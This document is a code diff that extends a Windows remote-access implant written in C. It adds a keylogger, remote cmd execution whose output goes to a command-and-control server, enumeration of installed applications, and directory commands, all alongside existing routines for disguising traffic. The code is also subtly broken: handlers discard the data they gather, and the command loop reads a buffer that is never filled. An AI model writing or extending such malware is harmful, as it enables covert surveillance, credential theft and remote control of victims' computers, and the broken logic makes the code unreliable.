@@ -7,6 +7,8 @@
 #include <ws2tcpip.h>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
+#include <psapi.h>
+#include <shellapi.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -131,17 +133,95 @@ void receive_data_from_c2(SSL* ssl) {
     }
 }
 
+// Change Directory (cd)
+void change_directory(SSL* ssl, const char* path) {
+    if (SetCurrentDirectory(path)) {
+        send_disguised_data(ssl);
+    } else {
+        send_disguised_data(ssl);
+    }
+}
+
+// Get current working directory (pwd)
+void get_current_directory(SSL* ssl) {
+    char cwd[BUFFER_SIZE];
+    if (GetCurrentDirectory(BUFFER_SIZE, cwd)) {
+        send_disguised_data(ssl);
+    } else {
+        send_disguised_data(ssl);
+    }
+}
+
+// List installed applications
+void list_installed_applications(SSL* ssl) {
+    char buffer[BUFFER_SIZE];
+    HKEY hUninstallKey = NULL;
+    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ, &hUninstallKey) != ERROR_SUCCESS) {
+        send_disguised_data(ssl);
+        return;
+    }
+    
+    DWORD index = 0;
+    char appName[BUFFER_SIZE];
+    while (RegEnumKeyEx(hUninstallKey, index, appName, &(DWORD){BUFFER_SIZE}, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
+        snprintf(buffer, BUFFER_SIZE, "Application: %s\n", appName);
+        send_disguised_data(ssl);
+        index++;
+    }
+    RegCloseKey(hUninstallKey);
+}
+
+// Capture keystrokes for X time
+void capture_keystrokes(SSL* ssl, int duration_seconds) {
+    char keystrokes[BUFFER_SIZE] = "";
+    DWORD startTime = GetTickCount();
+    
+    while ((GetTickCount() - startTime) / 1000 < duration_seconds) {
+        for (int key = 8; key <= 255; key++) {
+            if (GetAsyncKeyState(key) & 0x8000) {
+                char keychar = (char)key;
+                strncat(keystrokes, &keychar, 1);
+            }
+        }
+        Sleep(10);  // Avoid busy-looping too much
+    }
+    
+    send_disguised_data(ssl);
+}
+
+// Run cmd command and send output to C2
+void run_cmd_command(SSL* ssl, const char* command) {
+    char buffer[BUFFER_SIZE];
+    FILE* pipe = _popen(command, "r");
+    if (!pipe) {
+        send_disguised_data(ssl);
+        return;
+    }
+    while (fgets(buffer, BUFFER_SIZE, pipe) != NULL) {
+        send_disguised_data(ssl);
+    }
+    _pclose(pipe);
+}
+
 // Main loop that communicates with the C2 server while performing random actions
 void main_loop(SSL* ssl) {
+    char buffer[BUFFER_SIZE];
     while (1) {
-        int random_action = rand() % 3;
+        receive_data_from_c2(ssl);
 
-        if (random_action == 0) {
-            send_disguised_data(ssl);
-        } else if (random_action == 1) {
-            mimic_legitimate_doh_request();
+        if (strncmp(buffer, "CD ", 3) == 0) {
+            change_directory(ssl, buffer + 3);  
+        } else if (strcmp(buffer, "PWD") == 0) {
+            get_current_directory(ssl);
+        } else if (strcmp(buffer, "LIST_APPS") == 0) {
+            list_installed_applications(ssl);
+        } else if (strncmp(buffer, "KEYLOG", 6) == 0) {
+            int duration = atoi(buffer + 7);  
+            capture_keystrokes(ssl, duration);
+        } else if (strncmp(buffer, "CMD ", 4) == 0) {
+            run_cmd_command(ssl, buffer + 4);  
         } else {
-            receive_data_from_c2(ssl);
+            printf("Unknown command received: %s\n", buffer);
         }
 
         random_sleep();
